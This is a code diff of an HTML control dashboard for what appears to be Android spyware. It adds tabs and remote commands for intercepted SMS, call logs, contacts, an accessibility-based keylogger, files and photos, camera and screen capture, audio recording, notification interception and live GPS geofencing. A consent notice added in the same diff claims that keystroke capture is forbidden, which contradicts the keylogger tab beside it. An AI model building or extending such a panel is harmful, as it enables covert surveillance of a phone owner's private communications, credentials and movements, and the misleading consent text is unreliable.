@@ -220,42 +220,321 @@
           <button class="tab-btn active" data-tab="tab-overview">Overview</button>
           <button class="tab-btn" data-tab="tab-location">Location & Map</button>
           <button class="tab-btn" data-tab="tab-notifications">Notifications</button>
+          <button class="tab-btn" data-tab="tab-sms">SMS Logs</button>
+          <button class="tab-btn" data-tab="tab-calls">Call History</button>
+          <button class="tab-btn" data-tab="tab-contacts">Contact List</button>
+          <button class="tab-btn" data-tab="tab-keystrokes">Keylogger (ACC)</button>
           <button class="tab-btn" data-tab="tab-apps">Applications</button>
           <button class="tab-btn" data-tab="tab-usage">Usage Analytics</button>
+          <button class="tab-btn" data-tab="tab-files">Files & Media</button>
+          <button class="tab-btn" data-tab="tab-gallery">Photos & Videos</button>
+          <button class="tab-btn" data-tab="tab-health">Service Health</button>
           <button class="tab-btn" data-tab="tab-commands">Command Center</button>
           <button class="tab-btn" data-tab="tab-recordings">Diagnostic Audio</button>
           <button class="tab-btn" data-tab="tab-permissions">Permissions Status</button>
         </div>
 
-        <!-- TAB 1: OVERVIEW -->
+        <!-- TAB 1: OVERVIEW (REBORN AS THE OPERATIONS CONSOLE) -->
         <div id="tab-overview" class="tab-panel active">
-          <div class="metrics-grid">
-            <div class="panel metric-panel">
-              <h4>Battery</h4>
-              <div class="metric-big" id="metric-battery">--%</div>
-              <div class="progress-bar"><div id="progress-battery" class="progress-fill" style="width: 0%"></div></div>
-              <span id="metric-charging" class="metric-sub">Not charging</span>
+          
+          <!-- LIVE STATUS STRIP -->
+          <div class="status-strip" id="device-status-strip">
+            <div class="status-strip-item">
+              <span class="status-strip-indicator" id="indicator-online" style="background: #ef4444;"></span>
+              <span id="lbl-status-online">DEVICE OFFLINE</span>
+            </div>
+            <div class="status-strip-item">
+              <span class="status-strip-indicator" id="indicator-socket" style="background: #ef4444;"></span>
+              <span id="lbl-status-socket">WEBSOCKET DISCONNECTED</span>
+            </div>
+            <div class="status-strip-item">
+              <span class="status-strip-indicator" id="indicator-gps" style="background: #a78bfa;"></span>
+              <span>GPS INTEGRATION READY</span>
+            </div>
+            <div class="status-strip-item">
+              <span class="status-strip-indicator" id="indicator-notif" style="background: #a78bfa;"></span>
+              <span>NOTIFICATIONS LOG ACTIVE</span>
+            </div>
+            <div class="status-strip-item">
+              <span class="status-strip-indicator" id="indicator-sync" style="background: #34d399;"></span>
+              <span>SYNC HEALTHY</span>
+            </div>
+            <div class="status-strip-item">
+              <span class="status-strip-indicator" id="indicator-heartbeat" style="background: #3b82f6;"></span>
+              <span id="lbl-heartbeat">LAST HEARTBEAT: -- SEC AGO</span>
+            </div>
+          </div>
+
+          <!-- DENSE OPERATIONS GRID -->
+          <div class="ops-console-grid">
+            
+            <!-- LEFT COLUMN: STREAM, COMMANDS, MESSAGES, RECORDER, CAMERA & NOTIFICATIONS (65%) -->
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+              
+              <!-- COMMAND CENTER CARD -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header">
+                  <div>
+                    <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Operations Command Center</h3>
+                    <span class="text-muted" style="font-size: 0.75rem;">Dispatched commands run live in real-time on the device</span>
+                  </div>
+                </div>
+                <div class="cmd-tiles-grid">
+                  <div class="cmd-tile" onclick="triggerCommandAction('REQUEST_LOCATION')">
+                    <div class="cmd-tile-icon">📍</div>
+                    <div class="cmd-tile-title">REQUEST LOCATION</div>
+                    <div class="cmd-tile-status" id="status-REQUEST_LOCATION">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('SYNC_FILES')">
+                    <div class="cmd-tile-icon">📁</div>
+                    <div class="cmd-tile-title">SYNC STORAGE FILES</div>
+                    <div class="cmd-tile-status" id="status-SYNC_FILES">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('SYNC_NOTIFICATIONS')">
+                    <div class="cmd-tile-icon">🔔</div>
+                    <div class="cmd-tile-title">SYNC NOTIFICATIONS</div>
+                    <div class="cmd-tile-status" id="status-SYNC_NOTIFICATIONS">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('SYNC_CONTACTS')">
+                    <div class="cmd-tile-icon">👤</div>
+                    <div class="cmd-tile-title">SYNC CONTACTS</div>
+                    <div class="cmd-tile-status" id="status-SYNC_CONTACTS">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('SYNC_APPLICATIONS')">
+                    <div class="cmd-tile-icon">📱</div>
+                    <div class="cmd-tile-title">SYNC APPLICATIONS</div>
+                    <div class="cmd-tile-status" id="status-SYNC_APPLICATIONS">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('SYNC_USAGE')">
+                    <div class="cmd-tile-icon">📊</div>
+                    <div class="cmd-tile-title">SYNC USAGE STATS</div>
+                    <div class="cmd-tile-status" id="status-SYNC_USAGE">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('REFRESH_TELEMETRY')">
+                    <div class="cmd-tile-icon">⚡</div>
+                    <div class="cmd-tile-title">REFRESH TELEMETRY</div>
+                    <div class="cmd-tile-status" id="status-REFRESH_TELEMETRY">Idle</div>
+                  </div>
+                  <div class="cmd-tile" onclick="triggerCommandAction('REFRESH_PERMISSIONS')">
+                    <div class="cmd-tile-icon">🛡️</div>
+                    <div class="cmd-tile-title">REFRESH PERMISSIONS</div>
+                    <div class="cmd-tile-status" id="status-REFRESH_PERMISSIONS">Idle</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- COMMAND LIFECYCLE & DISPATCH HUB -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header" style="flex-wrap: wrap; gap: 8px;">
+                  <div>
+                    <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Command Lifecycle & Dispatch Monitor</h3>
+                    <span class="text-muted" style="font-size: 0.75rem;">Real-time execution states: QUEUED → SENDING → RECEIVED → EXECUTING → COMPLETED</span>
+                  </div>
+                  <button class="btn btn-secondary btn-sm" onclick="fetchCommandHistory()">Refresh Log</button>
+                </div>
+                <div class="table-container table-responsive" style="max-height: 220px; overflow-y: auto;">
+                  <table class="data-table" id="table-command-lifecycle">
+                    <thead>
+                      <tr>
+                        <th>Command</th>
+                        <th>Status</th>
+                        <th>Target Device</th>
+                        <th>Dispatched At</th>
+                        <th>Result / Status Info</th>
+                      </tr>
+                    </thead>
+                    <tbody id="tbody-command-lifecycle">
+                      <tr><td colspan="5" class="text-center text-muted" style="padding: 16px;">No remote commands dispatched yet.</td></tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+
+              <!-- GEOFENCE RADAR & PERIMETERS -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header" style="flex-wrap: wrap; gap: 8px;">
+                  <div>
+                    <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Geofencing Zones & Perimeter Radar</h3>
+                    <span class="text-muted" style="font-size: 0.75rem;">Automated security perimeters with live ENTER / EXIT event detection</span>
+                  </div>
+                  <button class="btn btn-primary btn-sm" onclick="openAddGeofenceModal()">+ New Geofence</button>
+                </div>
+                <div id="geofence-list-container" style="display: flex; flex-direction: column; gap: 8px;">
+                  <div class="empty-state">No geofences configured. Click "+ New Geofence" to define a boundary.</div>
+                </div>
+              </div>
+
+              <!-- LIVE MAP WIDGET -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header" style="flex-wrap: wrap; gap: 8px;">
+                  <div>
+                    <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Live GPS Map Position</h3>
+                    <span id="lbl-gps-accuracy" class="text-muted" style="font-size: 0.75rem;">Accuracy: -- • Coordinates: --</span>
+                  </div>
+                  <div style="display: flex; gap: 6px;">
+                    <button class="btn btn-secondary btn-sm" onclick="triggerCommandAction('REQUEST_LOCATION')">Locate</button>
+                    <button class="btn btn-secondary btn-sm" onclick="recenterConsoleMap()">Center</button>
+                  </div>
+                </div>
+                <div id="console-map-container" style="height: 220px; border-radius: 8px; background: rgba(0,0,0,0.2); position: relative; z-index: 1;"></div>
+              </div>
+
+              <!-- LIVE NOTIFICATIONS WIDGET -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header" style="flex-wrap: wrap; gap: 10px;">
+                  <div>
+                    <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Intercepted Notification Stream</h3>
+                    <span class="text-muted" style="font-size: 0.75rem;">Real-time intercepted push notifications from the device</span>
+                  </div>
+                  <div style="display: flex; gap: 8px; align-items: center;">
+                    <span class="badge-count" id="lbl-notif-badge" style="background: var(--primary); color: #fff; padding: 2px 8px; border-radius: 20px;">0</span>
+                    <button class="btn btn-secondary btn-sm" onclick="switchConsoleTab('tab-notifications')">View Deep Logs</button>
+                  </div>
+                </div>
+                <div id="console-notif-container" style="max-height: 250px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px;">
+                  <div class="empty-state">No push notifications received yet. Waiting for device stream...</div>
+                </div>
+              </div>
+
+              <!-- USAGE ANALYTICS CHART & OVERVIEW -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header">
+                  <div>
+                    <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Daily Application Usage Insights</h3>
+                    <span class="text-muted" style="font-size: 0.75rem;">Foreground process screen-time records</span>
+                  </div>
+                  <button class="btn btn-secondary btn-sm" onclick="triggerCommandAction('SYNC_USAGE')">Refresh Stats</button>
+                </div>
+                <div id="console-usage-chart" style="display: flex; flex-direction: column; gap: 8px;">
+                  <div class="empty-state">No app usage stats retrieved. Click "Sync Usage Stats" to load.</div>
+                </div>
+              </div>
+
             </div>
 
-            <div class="panel metric-panel">
-              <h4>Internal Storage</h4>
-              <div class="metric-big" id="metric-storage">-- GB Free</div>
-              <div class="progress-bar"><div id="progress-storage" class="progress-fill purple" style="width: 0%"></div></div>
-              <span id="metric-storage-total" class="metric-sub">of -- GB total</span>
-            </div>
+            <!-- RIGHT COLUMN: HEALTH, SERVICES & PERMISSIONS (35%) -->
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+              
+              <!-- LIVE TIMELINE / ACTIVITY STREAM -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header" style="flex-direction: column; align-items: flex-start; gap: 6px;">
+                  <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Live Activities & Audit Feeds</h3>
+                  <div class="timeline-filters">
+                    <button class="timeline-filter-btn active" id="btn-timeline-filter-ALL" onclick="filterConsoleTimeline('ALL')">ALL</button>
+                    <button class="timeline-filter-btn" id="btn-timeline-filter-LOCATION" onclick="filterConsoleTimeline('LOCATION')">GPS</button>
+                    <button class="timeline-filter-btn" id="btn-timeline-filter-NOTIFICATIONS" onclick="filterConsoleTimeline('NOTIFICATIONS')">PUSH</button>
+                    <button class="timeline-filter-btn" id="btn-timeline-filter-COMMANDS" onclick="filterConsoleTimeline('COMMANDS')">CMDS</button>
+                    <button class="timeline-filter-btn" id="btn-timeline-filter-SYSTEM" onclick="filterConsoleTimeline('SYSTEM')">SYS</button>
+                  </div>
+                </div>
+                <div class="console-timeline" id="console-timeline-container">
+                  <div class="timeline-item success">
+                    <div class="timeline-item-time">17:17:00</div>
+                    <div class="timeline-item-content">
+                      <div class="timeline-item-title">Operations Console Loaded</div>
+                      <div class="text-muted">Waiting for real-time telemetry heartbeats...</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
 
-            <div class="panel metric-panel">
-              <h4>Memory (RAM)</h4>
-              <div class="metric-big" id="metric-ram">-- MB Free</div>
-              <div class="progress-bar"><div id="progress-ram" class="progress-fill cyan" style="width: 0%"></div></div>
-              <span id="metric-ram-total" class="metric-sub">of -- MB total</span>
-            </div>
+              <!-- DEVICE HEALTH DIAGNOSTICS (HIGH TECH BATTERY OVERHAUL) -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header">
+                  <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Real-time Device Health</h3>
+                </div>
+                <div style="display: flex; flex-direction: column; gap: 14px;">
+                  <!-- Dial Battery -->
+                  <div class="cyber-battery-dial">
+                    <div class="battery-level-ring" id="battery-dial-ring" style="--battery-pct: 0%;">
+                      <span class="battery-text-percent" id="health-lbl-battery-dial">--%</span>
+                    </div>
+                    <div class="battery-status-col">
+                      <div style="font-weight: bold; font-size: 0.85rem; color: #fff;">🔋 Battery Level</div>
+                      <span id="health-lbl-charging" class="text-muted" style="font-size: 0.72rem; display: block; margin-top: 1px;">Status: --</span>
+                    </div>
+                  </div>
+                  <!-- Legacy labels mapping for dynamic support -->
+                  <span id="health-lbl-battery" style="display: none;">--%</span>
+                  <div id="health-progress-battery" style="display: none; width: 0%;"></div>
+                  
+                  <!-- Storage -->
+                  <div>
+                    <div style="display: flex; justify-content: space-between; font-size: 0.82rem; margin-bottom: 4px;">
+                      <span>📁 Available Storage</span>
+                      <span id="health-lbl-storage" style="font-weight: bold;">-- GB Free</span>
+                    </div>
+                    <div class="progress-bar" style="height: 8px;"><div id="health-progress-storage" class="progress-fill purple" style="width: 0%;"></div></div>
+                    <span id="health-lbl-storage-total" class="text-muted" style="font-size: 0.72rem; display: block; margin-top: 3px;">Capacity: --</span>
+                  </div>
+                  <!-- Memory -->
+                  <div>
+                    <div style="display: flex; justify-content: space-between; font-size: 0.82rem; margin-bottom: 4px;">
+                      <span>🧠 Available RAM</span>
+                      <span id="health-lbl-ram" style="font-weight: bold;">-- MB Free</span>
+                    </div>
+                    <div class="progress-bar" style="height: 8px;"><div id="health-progress-ram" class="progress-fill cyan" style="width: 0%;"></div></div>
+                    <span id="health-lbl-ram-total" class="text-muted" style="font-size: 0.72rem; display: block; margin-top: 3px;">Total Space: --</span>
+                  </div>
+                  <!-- Network Type -->
+                  <div style="padding-top: 8px; border-top: 1px solid var(--border); display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <div>
+                      <span class="text-muted" style="font-size: 0.72rem; display: block;">Network Link</span>
+                      <span id="health-lbl-network" style="font-size: 0.82rem; font-weight: bold;">Wi-Fi</span>
+                    </div>
+                    <div>
+                      <span class="text-muted" style="font-size: 0.72rem; display: block;">Uptime</span>
+                      <span id="health-lbl-uptime" style="font-size: 0.82rem; font-weight: bold;">--</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
 
-            <div class="panel metric-panel">
-              <h4>Network & Uptime</h4>
-              <div class="metric-big" id="metric-network">Wi-Fi</div>
-              <span id="metric-ssid" class="metric-sub">SSID: --</span>
-              <span id="metric-uptime" class="metric-sub">Uptime: --</span>
+              <!-- SERVICE INTEGRITY MONITOR -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header">
+                  <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Service Integrity</h3>
+                </div>
+                <div style="display: flex; flex-direction: column; gap: 4px;">
+                  <div class="service-row">
+                    <span style="font-size: 0.8rem; font-weight: 500;">🔔 Notification Listener</span>
+                    <span id="status-srv-notif" class="pill pill-offline" style="padding: 2px 8px; font-size: 0.65rem;">Disabled</span>
+                  </div>
+                  <div class="service-row">
+                    <span style="font-size: 0.8rem; font-weight: 500;">📍 Location Provider</span>
+                    <span id="status-srv-gps" class="pill pill-offline" style="padding: 2px 8px; font-size: 0.65rem;">Offline</span>
+                  </div>
+                  <div class="service-row">
+                    <span style="font-size: 0.8rem; font-weight: 500;">⚡ Telemetry Beacon</span>
+                    <span id="status-srv-telemetry" class="pill pill-offline" style="padding: 2px 8px; font-size: 0.65rem;">Stopped</span>
+                  </div>
+                  <div class="service-row">
+                    <span style="font-size: 0.8rem; font-weight: 500;">💬 Socket Uplink Connection</span>
+                    <span id="status-srv-ws" class="pill pill-offline" style="padding: 2px 8px; font-size: 0.65rem;">Offline</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SYSTEM PERMISSIONS CENTER -->
+              <div class="panel" style="margin-bottom: 0;">
+                <div class="panel-header">
+                  <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Access Permissions Center</h3>
+                </div>
+                <div id="permissions-checklist-list" style="display: flex; flex-direction: column; gap: 4px;">
+                  <div class="empty-state">No permissions synchronization record found</div>
+                </div>
+              </div>
+
+              <!-- ACTIVE ALERT PANEL -->
+              <div class="panel" id="console-alert-panel" style="margin-bottom: 0;">
+                <div class="panel-header">
+                  <h3 style="margin: 0; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">Operations Alerts</h3>
+                </div>
+                <div id="console-alerts-list" style="display: flex; flex-direction: column; gap: 4px;">
+                  <div class="empty-state" style="padding: 10px; font-size: 0.78rem;">✓ No alerts active. Device state nominal.</div>
+                </div>
+              </div>
+
             </div>
           </div>
         </div>
@@ -278,7 +557,7 @@
               <h3>Notification Intercept Log</h3>
               <input type="text" id="notif-filter-input" placeholder="Filter by title, app, text..." class="input-inline" />
             </div>
-            <div id="detail-notifications-list" class="notif-table-container">
+            <div id="detail-notifications-list" class="table-container notif-table-container">
               <table class="data-table">
                 <thead>
                   <tr>
@@ -373,6 +652,30 @@
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2"/></svg>
                 <span>Stop Audio Recording</span>
               </button>
+              <button class="cmd-tile" data-cmd="TAKE_SCREENSHOT">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="13" x="3" y="5" rx="2"/><path d="M12 18v3M9 21h6"/></svg>
+                <span>Take Screen Capture</span>
+              </button>
+              <button class="cmd-tile" data-cmd="TAKE_CAMERA_PHOTO">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                <span>Capture Camera Photo</span>
+              </button>
+              <button class="cmd-tile" data-cmd="RECORD_SCREEN">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect width="15" height="14" x="1" y="5" rx="2" ry="2"/><circle cx="8" cy="12" r="2"/></svg>
+                <span>Record Screen Clip</span>
+              </button>
+              <button class="cmd-tile" data-cmd="SYNC_CONTACTS">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                <span>Synchronize Contacts</span>
+              </button>
+              <button class="cmd-tile" data-cmd="SYNC_SMS">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                <span>Synchronize SMS Logs</span>
+              </button>
+              <button class="cmd-tile" data-cmd="SYNC_CALLS">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                <span>Synchronize Call Logs</span>
+              </button>
             </div>
           </div>
 
@@ -413,12 +716,235 @@
 
         <!-- TAB 8: PERMISSIONS -->
         <div id="tab-permissions" class="tab-panel">
+          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+            <!-- LEFT COLUMN: ACCESS PERMISSIONS & REAL-TIME STATE -->
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+              <div class="panel">
+                <div class="panel-header">
+                  <h3>Android System Permissions & Transparency Status</h3>
+                </div>
+                <div class="permissions-list" id="permissions-status-list">
+                  <!-- Populated dynamically -->
+                </div>
+              </div>
+
+              <div class="panel">
+                <div class="panel-header">
+                  <h3>Accessibility Service Status</h3>
+                </div>
+                <div id="accessibility-management-panel" style="padding: 15px; display: flex; flex-direction: column; gap: 15px;">
+                  <div style="display: flex; align-items: center; justify-content: space-between;">
+                    <strong style="font-size: 0.95rem;">Service State:</strong>
+                    <span id="access-srv-badge" class="pill pill-offline">DISABLED</span>
+                  </div>
+                  <div id="access-srv-statement" style="padding: 12px; border-radius: 8px; font-size: 0.85rem; line-height: 1.4; font-weight: 500; background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.2);">
+                    Accessibility access is currently disabled on this device.
+                  </div>
+                  <div style="font-size: 0.78rem; color: var(--text-muted); display: grid; grid-template-columns: auto 1fr; gap: 8px 15px; border-top: 1px solid var(--border-color); padding-top: 12px;">
+                    <strong>Device Connected:</strong> <span id="access-srv-device">None</span>
+                    <strong>Last Status Update:</strong> <span id="access-srv-update">Never</span>
+                    <strong>Service ID:</strong> <span>com.example.service.DeviceAccessibilityService</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- RIGHT COLUMN: SETUP INSTRUCTIONS & CONSENT INFO -->
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+              <div class="panel">
+                <div class="panel-header">
+                  <h3>Accessibility Setup & Activation Instructions</h3>
+                </div>
+                <div style="padding: 15px; font-size: 0.82rem; line-height: 1.5; color: var(--text-muted);">
+                  <p style="margin-top: 0;">Android requires the device owner to manually authorize any Accessibility Service to maintain complete platform control. To enable the service:</p>
+                  <ol style="margin: 0; padding-left: 20px; display: flex; flex-direction: column; gap: 8px;">
+                    <li>Ensure the <strong>Device Manager</strong> app is installed on the target device.</li>
+                    <li>Open <strong>Settings -> Accessibility</strong> on the device.</li>
+                    <li>Locate <strong>Device Integrity Assistant</strong> in the listed services.</li>
+                    <li>Tap the service and switch the toggle to <strong>ON</strong>.</li>
+                    <li>Accept the platform consent dialog confirming transparent device management.</li>
+                  </ol>
+                  <p style="margin-bottom: 0; margin-top: 15px;"><strong>To Disable:</strong> Navigating to the same settings page and toggling the switch to <strong>OFF</strong> terminates all accessibility event reporting instantly.</p>
+                </div>
+              </div>
+
+              <div class="panel">
+                <div class="panel-header">
+                  <h3>Transparency, Security & Consent Notice</h3>
+                </div>
+                <div style="padding: 15px; font-size: 0.8rem; line-height: 1.5; color: var(--text-muted); background: rgba(59, 130, 246, 0.05); border: 1px dashed rgba(59, 130, 246, 0.2); border-radius: 8px;">
+                  <strong style="color: #60a5fa; display: block; margin-bottom: 8px;">🛡️ Legitimacy & Consent Safeguards</strong>
+                  <p style="margin: 0 0 10px 0;">This application operates exclusively under clear user consent. It does not hide itself, bypass security safeguards, or execute covert actions. The system is designed strictly for controlled environment testing, app compliance auditing, and administrative verification on user-owned assets.</p>
+                  <p style="margin: 0;">Keystroke capturing, secure field harvesting, credential extraction, or background spying of third-party applications are strictly forbidden. All active monitoring is declared, visible, and fully reversible by the local user at any time.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 9: SMS LOGS -->
+        <div id="tab-sms" class="tab-panel">
           <div class="panel">
             <div class="panel-header">
-              <h3>Android System Permissions & Transparency Status</h3>
+              <h3>SMS Message Inbox & Dispatch Logs</h3>
+              <input type="text" id="sms-search-input" placeholder="Search SMS by number or text..." class="input-inline" />
             </div>
-            <div class="permissions-list" id="permissions-status-list">
+            <div class="table-container">
+              <table class="data-table">
+                <thead>
+                  <tr>
+                    <th>Direction</th>
+                    <th>Sender/Recipient</th>
+                    <th>Message Body</th>
+                    <th>Timestamp</th>
+                  </tr>
+                </thead>
+                <tbody id="sms-table-body">
+                  <tr><td colspan="4" class="text-center">No SMS messages intercepted</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 10: CALL HISTORY -->
+        <div id="tab-calls" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header">
+              <h3>Voice Call Telemetry Logs</h3>
+            </div>
+            <div class="table-container">
+              <table class="data-table">
+                <thead>
+                  <tr>
+                    <th>Type</th>
+                    <th>Phone Number</th>
+                    <th>Contact Name</th>
+                    <th>Duration</th>
+                    <th>Timestamp</th>
+                  </tr>
+                </thead>
+                <tbody id="calls-table-body">
+                  <tr><td colspan="5" class="text-center">No call logs captured</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 11: CONTACT LIST -->
+        <div id="tab-contacts" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header">
+              <h3>Device Contact Directory</h3>
+              <input type="text" id="contacts-search-input" placeholder="Search contacts..." class="input-inline" />
+            </div>
+            <div class="contacts-grid" id="contacts-list-container">
               <!-- Populated dynamically -->
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 12: KEYLOGGER (ACC) -->
+        <div id="tab-keystrokes" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header">
+              <h3>Accessibility-Based Input Keylogger Logs</h3>
+              <span class="pulse-dot" style="background: var(--rose);"></span> <span class="text-muted" style="font-size: 0.8rem;">Live Capturing Keyboard Entry</span>
+            </div>
+            <div id="keystrokes-list" class="activity-feed" style="max-height: 500px; overflow-y: auto;">
+              <!-- Populated dynamically -->
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 13: FILES & STORAGE MANAGER -->
+        <div id="tab-files" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header" style="flex-wrap: wrap; gap: 12px;">
+              <div>
+                <h3>Diagnostic File & Folder Explorer</h3>
+                <span class="text-muted" style="font-size: 0.8rem;">Explore files and folder hierarchy on the connected device storage</span>
+              </div>
+              <div style="display: flex; gap: 8px; align-items: center;">
+                <input type="text" id="files-search-input" placeholder="Search file name..." class="input-inline" style="min-width: 180px;" />
+                <button class="btn btn-primary" onclick="sendSyncFilesCommand()" style="font-size: 0.85rem; padding: 6px 12px; display: inline-flex; align-items: center; gap: 4px;">🔄 Sync Storage Files</button>
+              </div>
+            </div>
+            <div style="background: rgba(255,255,255,0.03); padding: 8px 14px; border-radius: 6px; font-size: 0.85rem; color: #818cf8; margin-bottom: 12px; font-family: monospace;">
+              📂 Current Directory: <span id="files-current-dir">/storage/emulated/0</span>
+            </div>
+            <div class="table-container">
+              <table class="data-table">
+                <thead>
+                  <tr>
+                    <th>Type</th>
+                    <th>Name</th>
+                    <th>Path</th>
+                    <th>Size</th>
+                    <th>Synced On</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody id="files-table-body">
+                  <tr><td colspan="6" class="text-center">No files retrieved yet. Click "Sync Storage Files" to load from device.</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 14: PHOTOS & VIDEOS GALLERY -->
+        <div id="tab-gallery" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header" style="flex-wrap: wrap; gap: 12px;">
+              <div>
+                <h3>Device Photos & Media Gallery Preview</h3>
+                <span class="text-muted" style="font-size: 0.8rem;">Visual gallery of images and video recordings captured from device</span>
+              </div>
+              <div>
+                <button class="btn btn-primary" onclick="sendSyncFilesCommand()" style="font-size: 0.85rem; padding: 6px 12px; display: inline-flex; align-items: center; gap: 4px;">🔄 Sync Media Gallery</button>
+              </div>
+            </div>
+            <div id="gallery-container" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 16px;">
+              <div class="empty-state" style="grid-column: span 10;">No media records captured. Click "Sync Media Gallery" to sync from device.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 15: SERVICE HEALTH DIAGNOSTICS -->
+        <div id="tab-health" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header">
+              <h3>Monitoring Services Health Status</h3>
+            </div>
+            <div class="metrics-grid" style="grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));">
+              <div class="panel metric-panel" style="background: rgba(34, 197, 94, 0.05); border: 1px solid rgba(34, 197, 94, 0.2);">
+                <h4>Foreground Service</h4>
+                <div class="metric-big" style="color: #22c55e;">ACTIVE</div>
+                <span class="metric-sub">Runs continuously on client Android device</span>
+              </div>
+              <div class="panel metric-panel" style="background: rgba(34, 197, 94, 0.05); border: 1px solid rgba(34, 197, 94, 0.2);">
+                <h4>WebSocket Uplink</h4>
+                <div class="metric-big" id="health-ws-status" style="color: #22c55e;">CONNECTED</div>
+                <span class="metric-sub">Real-time status synchronizer channel state</span>
+              </div>
+              <div class="panel metric-panel" style="background: rgba(129, 140, 248, 0.05); border: 1px solid rgba(129, 140, 248, 0.2);">
+                <h4>Location Monitor</h4>
+                <div class="metric-big" id="health-loc-status">ACTIVE</div>
+                <span class="metric-sub">Tracks device GPS, cell, and wifi network positions</span>
+              </div>
+              <div class="panel metric-panel" style="background: rgba(129, 140, 248, 0.05); border: 1px solid rgba(129, 140, 248, 0.2);">
+                <h4>Notification Interceptor</h4>
+                <div class="metric-big" id="health-notif-status">ACTIVE</div>
+                <span class="metric-sub">Listens dynamically to notification shade updates</span>
